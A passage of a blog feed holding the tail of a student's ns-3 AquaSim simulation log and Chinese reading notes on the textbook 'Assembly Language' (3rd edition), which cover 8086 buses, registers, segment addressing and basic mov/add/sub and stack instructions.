class="number">0x556037496c30</span>)</span><br><span class="line"><span class="title class_">Creating</span> <span class="title class_">Nodes</span></span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">AddDevice</span>(<span class="number">0x556037450b30</span>, <span class="number">0x556037497630</span>) <span class="comment">//将设备绑定到节点(节点号，设备号)</span></span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">GetId</span>(<span class="number">0x556037450b30</span>)</span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">NotifyDeviceAdded</span>(<span class="number">0x556037450b30</span>, <span class="number">0x556037497630</span>)</span><br><span class="line"><span class="title class_">Node</span>:<span class="number">02</span>-<span class="number">02</span>-<span class="number">00</span>:<span class="number">01</span> <span class="title function_">position</span>(x):<span class="number">0</span></span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">AddDevice</span>(<span class="number">0x55603749aad0</span>, <span class="number">0x556037498570</span>)</span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">GetId</span>(<span class="number">0x55603749aad0</span>)</span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">NotifyDeviceAdded</span>(<span class="number">0x55603749aad0</span>, <span class="number">0x556037498570</span>)</span><br><span class="line"><span class="title class_">Node</span>:<span class="number">02</span>-<span class="number">02</span>-<span class="number">00</span>:<span class="number">02</span> <span class="title function_">position</span>(x):<span class="number">100</span></span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">AddDevice</span>(<span class="number">0x556037496b40</span>, <span class="number">0x556037485480</span>)</span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">GetId</span>(<span class="number">0x556037496b40</span>)</span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">NotifyDeviceAdded</span>(<span class="number">0x556037496b40</span>, <span class="number">0x556037485480</span>)</span><br><span class="line"><span class="title class_">Node</span>:<span class="number">02</span>-<span class="number">02</span>-<span class="number">00</span>:<span class="number">03</span> <span class="title function_">position</span>(x):<span class="number">200</span></span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">AddDevice</span>(<span class="number">0x556037496c30</span>, <span class="number">0x5560374868e0</span>)</span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">GetId</span>(<span class="number">0x556037496c30</span>)</span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">NotifyDeviceAdded</span>(<span class="number">0x556037496c30</span>, <span class="number">0x5560374868e0</span>)</span><br><span class="line"><span class="title class_">Sink</span>:<span class="number">02</span>-<span class="number">02</span>-<span class="number">00</span>:<span class="number">04</span> <span class="title function_">position</span>(x):<span class="number">300</span></span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">AddApplication</span>(<span class="number">0x556037450b30</span>, <span class="number">0x556037488590</span>)</span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">GetId</span>(<span class="number">0x556037450b30</span>)</span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">AddApplication</span>(<span class="number">0x55603749aad0</span>, <span class="number">0x556037488b00</span>)</span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">GetId</span>(<span class="number">0x55603749aad0</span>)</span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">AddApplication</span>(<span class="number">0x556037496b40</span>, <span class="number">0x556037488fd0</span>)</span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">GetId</span>(<span class="number">0x556037496b40</span>)</span><br><span class="line"><span class="title class_">PacketSocket</span>:<span class="title class_">PacketSocket</span>(<span class="number">0x556037489480</span>)</span><br><span class="line"><span class="title class_">PacketSocket</span>:<span class="title class_">SetNode</span>(<span class="number">0x556037489480</span>, <span class="number">0x556037496c30</span>)</span><br><span class="line"><span class="title class_">PacketSocket</span>:<span class="title class_">Bind</span>(<span class="number">0x556037489480</span>, <span class="number">03</span>-0b-<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">02</span>:<span class="number">02</span>:<span class="number">00</span>:<span class="number">04</span>)</span><br><span class="line"><span class="title class_">PacketSocket</span>:<span class="title class_">DoBind</span>(<span class="number">0x556037489480</span>, <span class="number">03</span>-0b-<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">02</span>:<span class="number">02</span>:<span class="number">00</span>:<span class="number">04</span>)</span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">RegisterProtocolHandler</span>(<span class="number">0x556037496c30</span>, <span class="number">0x7fffdba158f8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">-----------<span class="title class_">Running</span> <span class="title class_">Simulation</span>-----------</span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">DoInitialize</span>(<span class="number">0x556037450b30</span>)</span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">DoInitialize</span>(<span class="number">0x55603749aad0</span>)</span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">DoInitialize</span>(<span class="number">0x556037496b40</span>)</span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">DoInitialize</span>(<span class="number">0x556037496c30</span>)</span><br><span class="line"><span class="title class_">PacketSocket</span>:<span class="title class_">PacketSocket</span>(<span class="number">0x5560374897e0</span>)</span><br><span class="line"><span class="title class_">PacketSocket</span>:<span class="title class_">SetNode</span>(<span class="number">0x5560374897e0</span>, <span class="number">0x556037450b30</span>)</span><br><span class="line"><span class="title class_">PacketSocket</span>:<span class="title class_">Connect</span>(<span class="number">0x5560374897e0</span>, <span class="number">03</span>-0b-<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">02</span>:<span class="number">02</span>:<span class="number">00</span>:<span class="number">04</span>)</span><br><span class="line"><span class="title class_">PacketSocket</span>:<span class="title class_">SetAllowBroadcast</span>(<span class="number">0x5560374897e0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="title class_">PacketSocket</span>:<span class="title class_">GetNode</span>(<span class="number">0x5560374897e0</span>)</span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">GetId</span>(<span class="number">0x556037450b30</span>)</span><br><span class="line"><span class="title class_">PacketSocket</span>:<span class="title class_">PacketSocket</span>(<span class="number">0x556037489b60</span>)</span><br><span class="line"><span class="title class_">PacketSocket</span>:<span class="title class_">SetNode</span>(<span class="number">0x556037489b60</span>, <span class="number">0x55603749aad0</span>)</span><br><span class="line"><span class="title class_">PacketSocket</span>:<span class="title class_">Connect</span>(<span class="number">0x556037489b60</span>, <span class="number">03</span>-0b-<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">02</span>:<span class="number">02</span>:<span class="number">00</span>:<span class="number">04</span>)</span><br><span class="line"><span class="title class_">PacketSocket</span>:<span class="title class_">SetAllowBroadcast</span>(<span class="number">0x556037489b60</span>, <span class="number">0</span>)</span><br><span class="line"><span class="title class_">PacketSocket</span>:<span class="title class_">GetNode</span>(<span class="number">0x556037489b60</span>)</span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">GetId</span>(<span class="number">0x55603749aad0</span>)</span><br><span class="line"><span class="title class_">PacketSocket</span>:<span class="title class_">PacketSocket</span>(<span class="number">0x556037489f30</span>)</span><br><span class="line"><span class="title class_">PacketSocket</span>:<span class="title class_">SetNode</span>(<span class="number">0x556037489f30</span>, <span class="number">0x556037496b40</span>)</span><br><span class="line"><span class="title class_">PacketSocket</span>:<span class="title class_">Connect</span>(<span class="number">0x556037489f30</span>, <span class="number">03</span>-0b-<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">02</span>:<span class="number">02</span>:<span class="number">00</span>:<span class="number">04</span>)</span><br><span class="line"><span class="title class_">PacketSocket</span>:<span class="title class_">SetAllowBroadcast</span>(<span class="number">0x556037489f30</span>, <span class="number">0</span>)</span><br><span class="line"><span class="title class_">PacketSocket</span>:<span class="title class_">GetNode</span>(<span class="number">0x556037489f30</span>)</span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">GetId</span>(<span class="number">0x556037496b40</span>)</span><br><span class="line"><span class="title class_">PacketSocket</span>:<span class="title class_">RecvFrom</span>(<span class="number">0x5560374897e0</span>, <span class="number">4294967295</span>, <span class="number">0</span>)</span><br><span class="line"><span class="title class_">PacketSocket</span>:<span class="title class_">RecvFrom</span>(<span class="number">0x556037489b60</span>, <span class="number">4294967295</span>, <span class="number">0</span>)</span><br><span class="line"><span class="title class_">PacketSocket</span>:<span class="title class_">RecvFrom</span>(<span class="number">0x556037489f30</span>, <span class="number">4294967295</span>, <span class="number">0</span>)</span><br><span class="line"><span class="title class_">PacketSocket</span>:<span class="title class_">RecvFrom</span>(<span class="number">0x5560374897e0</span>, <span class="number">4294967295</span>, <span class="number">0</span>)</span><br><span class="line"><span class="title class_">PacketSocket</span>:<span class="title class_">RecvFrom</span>(<span class="number">0x556037489b60</span>, <span class="number">4294967295</span>, <span class="number">0</span>)</span><br><span class="line"><span class="title class_">PacketSocket</span>:<span class="title class_">RecvFrom</span>(<span class="number">0x556037489f30</span>, <span class="number">4294967295</span>, <span class="number">0</span>)</span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">DoDispose</span>(<span class="number">0x556037450b30</span>)</span><br><span class="line"><span class="title class_">AquaSimBroadcastMac</span>:<span class="title class_">DoDispose</span>(<span class="number">0x556037497f10</span>)</span><br><span class="line"><span class="title class_">PacketSocket</span>:<span class="title class_">DoDispose</span>(<span class="number">0x5560374897e0</span>)</span><br><span class="line"><span class="title class_">PacketSocket</span>:~<span class="title class_">PacketSocket</span>(<span class="number">0x5560374897e0</span>)</span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">DoDispose</span>(<span class="number">0x55603749aad0</span>)</span><br><span class="line"><span class="title class_">AquaSimBroadcastMac</span>:<span class="title class_">DoDispose</span>(<span class="number">0x556037484c30</span>)</span><br><span class="line"><span class="title class_">PacketSocket</span>:<span class="title class_">DoDispose</span>(<span class="number">0x556037489b60</span>)</span><br><span class="line"><span class="title class_">PacketSocket</span>:~<span class="title class_">PacketSocket</span>(<span class="number">0x556037489b60</span>)</span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">DoDispose</span>(<span class="number">0x556037496b40</span>)</span><br><span class="line"><span class="title class_">AquaSimBroadcastMac</span>:<span class="title class_">DoDispose</span>(<span class="number">0x5560374860a0</span>)</span><br><span class="line"><span class="title class_">PacketSocket</span>:<span class="title class_">DoDispose</span>(<span class="number">0x556037489f30</span>)</span><br><span class="line"><span class="title class_">PacketSocket</span>:~<span class="title class_">PacketSocket</span>(<span class="number">0x556037489f30</span>)</span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">DoDispose</span>(<span class="number">0x556037496c30</span>)</span><br><span class="line"><span class="title class_">AquaSimBroadcastMac</span>:<span class="title class_">DoDispose</span>(<span class="number">0x556037487650</span>)</span><br><span class="line">fin.</span><br><span class="line"><span class="title class_">PacketSocket</span>:<span class="title class_">DoDispose</span>(<span class="number">0x556037489480</span>)</span><br><span class="line"><span class="title class_">PacketSocket</span>:~<span class="title class_">PacketSocket</span>(<span class="number">0x556037489480</span>)</span><br><span class="line"><span class="title class_">Node</span>:~<span class="title class_">Node</span>(<span class="number">0x556037496c30</span>)</span><br><span class="line"><span class="title class_">Node</span>:~<span class="title class_">Node</span>(<span class="number">0x556037450b30</span>)</span><br><span class="line"><span class="title class_">Node</span>:~<span class="title class_">Node</span>(<span class="number">0x55603749aad0</span>)</span><br><span class="line"><span class="title class_">Node</span>:~<span class="title class_">Node</span>(<span class="number">0x556037496b40</span>)</span><br></pre></td></tr></table></figure></div>
<h2 id="仍需理解的部分"><a href="#仍需理解的部分" class="headerlink" title="仍需理解的部分"></a>仍需理解的部分</h2><h3 id="Packet套接字"><a href="#Packet套接字" class="headerlink" title="Packet套接字"></a>Packet套接字</h3><h3 id="AquaSimHelper"><a href="#AquaSimHelper" class="headerlink" title="AquaSimHelper"></a>AquaSimHelper</h3><h3 id="mobility"><a href="#mobility" class="headerlink" title="mobility"></a>mobility</h3><h3 id="position-是如何分配到节点上的"><a href="#position-是如何分配到节点上的" class="headerlink" title="position 是如何分配到节点上的"></a>position 是如何分配到节点上的</h3>]]></content>
      <categories>
        <category>学习笔记</category>
        <category>研究生</category>
      </categories>
      <tags>
        <tag>吉林大学</tag>
        <tag>计算机网络</tag>
        <tag>Aquasim</tag>
        <tag>ns-3</tag>
      </tags>
  </entry>
  <entry>
    <title>《汇编语言》第三版阅读笔记</title>
    <url>/2022/10/11/%E3%80%8A%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E3%80%8B%E7%AC%AC%E4%B8%89%E7%89%88%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="第一章-基础知识"><a href="#第一章-基础知识" class="headerlink" title="第一章 基础知识"></a><strong>第一章 基础知识</strong></h2><p>汇编课程研究重点放在如何利用硬件系统的编程结构和指令集有效灵活的控制系统进行工作。</p>
<h3 id="1-1-机器语言"><a href="#1-1-机器语言" class="headerlink" title="1.1 机器语言"></a><strong>1.1 机器语言</strong></h3><p>机器语言是机器指令的集合。电子计算机的机器指令是一列二进制数字。计算机将之转换为一列高低电平，以使计算机的电子器件受到驱动，进行运算。</p>
<p>每一种微处理器都有自己的机器指令集，也就是机器语言。</p>
<h3 id="1-2-汇编语言的产生"><a href="#1-2-汇编语言的产生" class="headerlink" title="1.2 汇编语言的产生"></a><strong>1.2 汇编语言的产生</strong></h3><p>机器语言难以辩别和记忆，基于此人们发明了汇编语言。</p>
<p><strong>寄存器</strong> 简单的讲是CPU中（内部）可以存储数据的器件。<br><strong>编译器</strong> 能够将汇编指令转换为机器指令的翻译程序。</p>
<h3 id="1-3-汇编语言的组成"><a href="#1-3-汇编语言的组成" class="headerlink" title="1.3 汇编语言的组成"></a><strong>1.3 汇编语言的组成</strong></h3><p>汇编语言主要由以下3类指令组成：  </p>
<p>（1） 汇编指令：机器码的助记符，有对应的机器码。<br>（2） 伪指令：没有对应的机器码，由编译器执行，计算机并不执行。<br>（3） 其他符号：如 +、-、*、&#x2F;等，由编译器识别，没有对应的机器码。</p>
<h3 id="1-4-存储器"><a href="#1-4-存储器" class="headerlink" title="1.4 存储器"></a><strong>1.4 存储器</strong></h3><h3 id="1-5-指令和数据"><a href="#1-5-指令和数据" class="headerlink" title="1.5 指令和数据"></a><strong>1.5 指令和数据</strong></h3><p>指令和数据是应用上的概念。在内存或磁盘上，指令和数据没有任何区别，都是二进制信息。</p>
<h3 id="1-6-存储单元"><a href="#1-6-存储单元" class="headerlink" title="1.6 存储单元"></a><strong>1.6 存储单元</strong></h3><p>计算机内的最小信息单位是bit，即一个二进制位。<br>计算机内的基本存储单元是Byte，即一个字节。一个字节等于8个二进制位。<br>1KB &#x3D; 1024B, 1MB &#x3D; 1024KB, 1GB &#x3D; 1024MB, 1TB &#x3D; 1024GB</p>
<h3 id="1-7-CPU-对存储器的读写"><a href="#1-7-CPU-对存储器的读写" class="headerlink" title="1.7 CPU 对存储器的读写"></a><strong>1.7 CPU 对存储器的读写</strong></h3><p>CPU通过地址总线给出数据存储位置。<br>CPU通过控制总线给出数据存储方向。<br>CUP通过数据总线进行数据传输。</p>
<h3 id="1-8-地址总线"><a href="#1-8-地址总线" class="headerlink" title="1.8 地址总线"></a><strong>1.8 地址总线</strong></h3><p>一个CPU有N根地址线，则可以说这个CPU的地址总线宽度为N。这样的CPU最多可以寻找2的N次方个内存单元。</p>
<h3 id="1-9-数据总线"><a href="#1-9-数据总线" class="headerlink" title="1.9 数据总线"></a><strong>1.9 数据总线</strong></h3><p>数据总线的宽度决定了CPU和外界的数据传送速度。</p>
<h3 id="1-10-控制总线"><a href="#1-10-控制总线" class="headerlink" title="1.10 控制总线"></a><strong>1.10 控制总线</strong></h3><p>CPU对外部器件的控制是通过控制总线来进行的。控制总线是一些不同控制线的集合。</p>
<h3 id="1-1-1-10-小结"><a href="#1-1-1-10-小结" class="headerlink" title="1.1~1.10 小结"></a><strong>1.1~1.10 小结</strong></h3><blockquote>
<p>（1） 汇编指令是机器指令的助记符，同机器指令一一对应。<br>（2） 每一种CPU都有自己的汇编指令集。<br>（3） CPU可以直接使用的信息在存储器中存放。<br>（4） 在存储器中指令和数据没有任何区别，都是二进制信息。<br>（5） 存储单元从零开始顺序编号。<br>（6） 一个存储单元可以存储8个bit，即8位二进制数。<br>（7） 1Byte &#x3D; 8bit， 1KB &#x3D; 1024B &#x3D; 2^10B， 1MB &#x3D; 1024KB &#x3D; 2^20B, 1GB &#x3D; 1024MB &#x3D; 2^30B。2^10 &#x3D; 1024, 2^16 &#x3D; 65536。<br>（8） 每一个CPU芯片都有许多管脚，这些管脚和总线相连。也可以说，这些管脚引出总线。一个CPU可以引出3中总线的宽度标志了这个CPU的不同方面的性能：<br>  地址总线的宽度决定了CPU的寻址能力；<br>  数据总线的宽度决定了CPU与其他器件进行数据传送时一次数据传送量；<br>  控制总线的宽度决定了CPU对系统中其他器件的控制能力。</p>
</blockquote>
<h3 id="1-11-内存地址空间（概述）"><a href="#1-11-内存地址空间（概述）" class="headerlink" title="1.11 内存地址空间（概述）"></a><strong>1.11 内存地址空间（概述）</strong></h3><p>  内存地址空间就是CPU可以通过地址总线寻址到的内存单元集合。</p>
<h3 id="1-12-主板"><a href="#1-12-主板" class="headerlink" title="1.12 主板"></a><strong>1.12 主板</strong></h3><h3 id="1-13-接口卡"><a href="#1-13-接口卡" class="headerlink" title="1.13 接口卡"></a><strong>1.13 接口卡</strong></h3><p>  CPU通过总线向接口卡发送命令，接口卡根据CPU的命令控制外设工作。如：网卡、显卡、声卡等。</p>
<h3 id="1-14-各类存储器芯片"><a href="#1-14-各类存储器芯片" class="headerlink" title="1.14 各类存储器芯片"></a><strong>1.14 各类存储器芯片</strong></h3><p>  <strong>RAM:</strong> 随机存储器，可读可写，但必须带电存储，断电后存储内容消失。<br>  <strong>ROM:</strong> 只读存储器，只能读出，不能写入。断电后存储内容不消失。<br>  <strong>BIOS:</strong> Basic Input&#x2F;Output System，基本输入输出系统。BIOS是由主板和各类接口卡（如显卡、网卡等）厂商提供的软件系统。 可以通过它利用该硬件设备进行最基本的输入输出。在主板和某些接口卡上茶油存储相应BIOS的ROM。例如，主板上的ROM中存储着主板的BIOS(通常称为系统BIOS)；显卡上的ROM存储着显卡的BIOS；如果网卡上装有ROM，那其中就可以存储网卡的BIOS。</p>
<h3 id="1-15-内存地址空间"><a href="#1-15-内存地址空间" class="headerlink" title="1.15 内存地址空间"></a><strong>1.15 内存地址空间</strong></h3><p>  最终运行程序的是CPU，我们用汇编语言编程的时候，必须要从CPU的角度考虑问题。对CPU来讲，系统中所有存储器中的存储单元都处于一个统一的逻辑存储器中，它的容量受CPU寻址能力的限制。这个逻辑存储器即是我们所说的内存地址空间。</p>
<hr>
<h2 id="第二章-寄存器"><a href="#第二章-寄存器" class="headerlink" title="第二章 寄存器"></a><strong>第二章 寄存器</strong></h2><p>  一个典型的CPU由运算器、控制器、寄存器等器件构成：   </p>
<ul>
<li>运算器进行信息处理；  </li>
<li>寄存器进行信息存储；  </li>
<li>控制器控制各种器件进行工作；  </li>
<li>内部总线连接各种器件，在它们之间进行数据的传送。</li>
</ul>
<p>寄存器是CPU内部的存储器件。  </p>
<p>8086CPU内部有14个寄存器，分别是：AX、BX、CX、DX、SI、DI、SP、BP、IP、CS、SS、DS、ES、PSW。这14个寄存器都是16位的。</p>
<h3 id="2-1-通用寄存器"><a href="#2-1-通用寄存器" class="headerlink" title="2.1 通用寄存器"></a><strong>2.1 通用寄存器</strong></h3><p>AX、BX、CX、DX这这四个寄存器通常用来存放一般性数据，被称为通用寄存器。  </p>
<p>为了保证向前兼容，8086CPU的AX、BX、CX、DX这4个寄存器可以分为两个独立使用的8位寄存器来用：  </p>
<ul>
<li>AX可以分为AH和AL;</li>
<li>BX可以分为BH和BL;</li>
<li>CX可以分为CH和CL;</li>
<li>DX可以分为DH和DL。</li>
</ul>
<h3 id="2-2-字在寄存器中的存储"><a href="#2-2-字在寄存器中的存储" class="headerlink" title="2.2 字在寄存器中的存储"></a><strong>2.2 字在寄存器中的存储</strong></h3><p>对于8086CPU来说，一个字由两个字节组成，这两个字节分别称之为高位字节和低位字节，并且存储于寄存器中的高8位和低8位。</p>
<h3 id="2-3-几条汇编指令"><a href="#2-3-几条汇编指令" class="headerlink" title="2.3 几条汇编指令"></a><strong>2.3 几条汇编指令</strong></h3><p>mov ax, 001AH——转移指令<br>add ax, bx——求和指令</p>
<h3 id="2-4-物理地址"><a href="#2-4-物理地址" class="headerlink" title="2.4 物理地址"></a><strong>2.4 物理地址</strong></h3><p>所有内存单元构成的存储空间是一个一维线性空间，每一个内存单元在这个空间都有唯一的地址，我们将这个唯一的地址称为物理地址。</p>
<h3 id="2-5-16位结构的CPU"><a href="#2-5-16位结构的CPU" class="headerlink" title="2.5 16位结构的CPU"></a><strong>2.5 16位结构的CPU</strong></h3><p>8086CPU是16位结构的CPU，这也就是说，在8086内部，能够一次性处理、传输、暂时存储的信息的最大长度是16位的。内存单元的地址在送上地址总线之前，必须在CPU中处理、传输、暂时存放，对于16位CPU，能一次性处理、传输、暂时存储16位的地址。</p>
<p>但8086CPU有20根地址总线，那么16位的8086CPU是如何给出20位的地址总线的呢？</p>
<h3 id="2-6-8086CPU给出物理地址的方法"><a href="#2-6-8086CPU给出物理地址的方法" class="headerlink" title="2.6 8086CPU给出物理地址的方法"></a><strong>2.6 8086CPU给出物理地址的方法</strong></h3><p>8086CPU地址总线长度大于字长，导致程序物理地址无法一次性传递给CPU。为此，8086CPU采用一种在内部用两个16位地址合成的方法来形成一个20位的物理地址。</p>
<p>当8086CPU要读写内存时：<br>（1）CPU中的相关部件提供两个16位的地址，一个称为段地址，另一个称为偏移地址；<br>（2）段地址和偏移地址通过内部总线送入一个称为地址加法器的部件；<br>（3）地址加法器将两个16位地址合成为一个20位的物理地址；<br>（4）地址加法器通过内部总线将20位物理地址送入输入输出控制电路；<br>（5）输入输出控制电路将20位物理地址送上地址总线；<br>（6）20位物理地址被地址总线送到存储器。</p>
<p>地址加法器采用物理地址 &#x3D; 段地址X16 + 偏移地址的方法用段地址和偏移地址合成物理地址。</p>
<h3 id="2-7-“段地址X16-偏移地址-物理地址”的本质含义"><a href="#2-7-“段地址X16-偏移地址-物理地址”的本质含义" class="headerlink" title="2.7  “段地址X16+偏移地址&#x3D;物理地址”的本质含义"></a><strong>2.7  “段地址X16+偏移地址&#x3D;物理地址”的本质含义</strong></h3><p>“段地址X16+偏移地址&#x3D;物理地址”的本质含义是：CPU在访问内存时，用一个基础地址（段地址X16）和一个相对基础地址的偏移地址相加，给出内存单元的物理地址。</p>
<p>举个例子：</p>
<p>假如说隔壁部门的同事张三来找你询问李四的工位？你发现李四的工位不好直接描述，既不是在角落也不是在中间。这时你发现李四旁边坐着的是经理，所以你告诉张三说李四就是经理左边第二位的那个人。这就是生活中使用“基础地址+偏移地址&#x3D;物理地址”的例子。  </p>
<p>还有比方说，大家描述学校水房的位置，一般会说在几号餐厅后面，或某宿舍楼旁边。</p>
<h3 id="2-8-段的概念"><a href="#2-8-段的概念" class="headerlink" title="2.8 段的概念"></a><strong>2.8 段的概念</strong></h3><p>CPU访问内存单元时，必须向内存提供内存单元的物理地址。8086CPU在内部用段地址和偏移地址移位相加的方法形成最终的物理地址。</p>
<p>CPU可以用不同的段地址和偏移地址形成同一个物理地址。</p>
<p>可以根据需要，将地址连续、起始地址为16的倍数的一组内存单元定义为一个段。</p>
<h3 id="2-9-段寄存器"><a href="#2-9-段寄存器" class="headerlink" title="2.9 段寄存器*"></a><strong>2.9 段寄存器</strong>*</h3><p>8086CPU内部有四个段寄存器：CS、DS、SS、ES。用于存储指定内存单元的段地址。</p>
<h3 id="2-10-CS和IP"><a href="#2-10-CS和IP" class="headerlink" title="2.10 CS和IP"></a><strong>2.10 CS和IP</strong></h3><p>8086PC机中，任意时刻，CPU将CS:IP指向的内容当作指令执行。其中CS为代码段寄存器，IP为指令指针寄存器。</p>
<p>8086CPU执行指令过程如下：</p>
<p>（1） 从CS：IP指向的内存单元读取指令，读取的指令进入指令缓冲器；<br>（2） IP &#x3D; IP + 所读指令的长度，从而指向下一条指令；<br>（3） 执行指令。转到步骤（1），重复这个过程。  </p>
<h3 id="2-11-修改CS、IP的指令"><a href="#2-11-修改CS、IP的指令" class="headerlink" title="2.11 修改CS、IP的指令"></a><strong>2.11 修改CS、IP的指令</strong></h3><p>能够改变CS、IP内容的指令被统称为转移指令。如jump指令。</p>
<h3 id="2-12-代码段"><a href="#2-12-代码段" class="headerlink" title="2.12 代码段"></a><strong>2.12 代码段</strong></h3><p>我们可以将长度为N(N &lt;&#x3D; 64KB)的一组代码，存在一组地址连续、起始地址为16的倍数的内存单元中。这段地质连续的内存空间就称之为代码段。简单来说也就是存放代码的段。</p>
<h3 id="2-9-2-12小结"><a href="#2-9-2-12小结" class="headerlink" title="2.9~2.12小结"></a><strong>2.9~2.12小结</strong></h3><blockquote>
<p>（1） 段地址在8086CPU的段寄存器中存放。当8086CPU要访问内存时，由段寄存器提供内存单元的段地址。8086CPU有4个段寄存器，其中CS用来存放指令的段地址。<br>（2） CS存放指令的段地址，IP存放指令的偏移地址。8086机中，任意时刻，CPU将CS:IP指向的内容当做指令指向。<br>（3） 8086CPU工作过程：略<br>（4） 8086CPU提供转移指令修改CS、IP的内容。  </p>
</blockquote>
<hr>
<h2 id="第三章-寄存器（内存访问）"><a href="#第三章-寄存器（内存访问）" class="headerlink" title="第三章 寄存器（内存访问）"></a><strong>第三章 寄存器（内存访问）</strong></h2><p>本章从内存访问的角度学习相关寄存器。</p>
<h3 id="3-1-内存中字的存储"><a href="#3-1-内存中字的存储" class="headerlink" title="3.1 内存中字的存储"></a><strong>3.1 内存中字的存储</strong></h3><p>字单元：存放一个字型数据（16位）的内存单元，由两个地址连续的内存单元组成。高地址内存单元存放字型数据的高位字节，低地址单元存放字型数据的低位字节。</p>
<p>这种存储方式也被称为小端存储，Intel系列的处理器一般都是小端存储。</p>
<h3 id="3-2-DS和-Address"><a href="#3-2-DS和-Address" class="headerlink" title="3.2 DS和[Address]"></a><strong>3.2 DS和[Address]</strong></h3><p>上一章我们学习了CS段寄存器，用于存放代码段段地址。这里我们再引入另外一个段寄存器DS，用于存放数据段段地址。</p>
<p>需要特别注意的是，8086CPU不支持将数据直接送入段寄存器。 包括所有的段寄存器CS、DS、SS、ES都不支持将数据从内存直接送入。内存中的数据必须先送入其他中间寄存器，然后在从中间寄存器送入段寄存器。（此处描述有误：栈操作”pop 段寄存器”实际上就是将数据从内存中直接送入段寄存器，此处应该更正为无法通过move指令将数据从内存中直接送入段寄存器）</p>
<p>“[address]”表示一个内存单元，中括号中的address表示内存单元的偏移地址。默认情况下，8686CPU取DS中的数据作为该内存单元的段地址。</p>
<h3 id="3-3-字的传送"><a href="#3-3-字的传送" class="headerlink" title="3.3 字的传送"></a><strong>3.3 字的传送</strong></h3><p>使用move指令一次可以传送一个字。move指令可以将数据从内存送入寄存器，也可以将数据从寄存器送入内存，也可以将数据从寄存器送入寄存器。<strong>但move指令不支持内存到内存的传送。</strong></p>
<h3 id="3-4-mov、add、sub指令"><a href="#3-4-mov、add、sub指令" class="headerlink" title="3.4 mov、add、sub指令"></a><strong>3.4 mov、add、sub指令</strong></h3><p>add指令和sub指令与mov指令用法类似，他们都有两个操作对象。这两个操作对象可以是如下格式：<br>寄存器， 数据<br>寄存器， 寄存器<br>寄存器， 内存单元<br>内存单元， 寄存器</p>
<p>有两点需要注意：<br>（1） mov、add、sub指令的两个操作对象不能同时为内存单元。<br>（2） 段寄存器只能接收mov指令传送数据，不可以进行算术运算。如 add ds, ax指令是违法的。（此处描述不够严谨，实际上段寄存器也可以接收来自操作栈的pop指令传递的数据）</p>
<h3 id="3-5-数据段"><a href="#3-5-数据段" class="headerlink" title="3.5 数据段"></a><strong>3.5 数据段</strong></h3><p>数据段是一段长度为N(N &lt;&#x3D; 64KB)、地址连续、其实地址为16的倍数的内存单元。我们用段寄存器DS存放数据段的段地址。</p>
<h3 id="3-1-3-5小结"><a href="#3-1-3-5小结" class="headerlink" title="3.1~3.5小结"></a><strong>3.1~3.5小结</strong></h3><blockquote>
<p>（1） 字在内存中存储时，要用两个地址连续的内存单元来存放，字的低位字节存放在低地址单元中，高位字节存放在高地址单元中。<br>（2） 用mov指令访问内存单元，可以在mov指令中只给出单元的偏移地址，此时，段地址默认在DS寄存器中。<br>（3）[address]表示一个偏移地址为address的内存单元。<br>（4） 在内存和寄存器之间传送数据时，高地址单元和高8位寄存器、低地址单元和低8位寄存器相对应。<br>（5） mov、add、sub是具有两个操作对象的指令。jmp是具有一个操作对象的指令。<br>（6） 可以根据自己的推测，在debug中实验指令的新格式。</p>
</blockquote>
<h3 id="3-6-栈"><a href="#3-6-栈" class="headerlink" title="3.6 栈"></a><strong>3.6 栈</strong></h3><p>栈就是一种先进后出的数据结构。LIFO(Last In First Out)。</p>
<h3 id="3-7-CPU提供的栈机制"><a href="#3-7-CPU提供的栈机制" class="headerlink" title="3.7 CPU提供的栈机制"></a><strong>3.7 CPU提供的栈机制</strong></h3><p>8086CPU对栈提供两个基本操作指令:PUSH（入栈）和POP（出栈）。 PUSH是将数据送入栈中，POP是将数据移出栈中。</p>
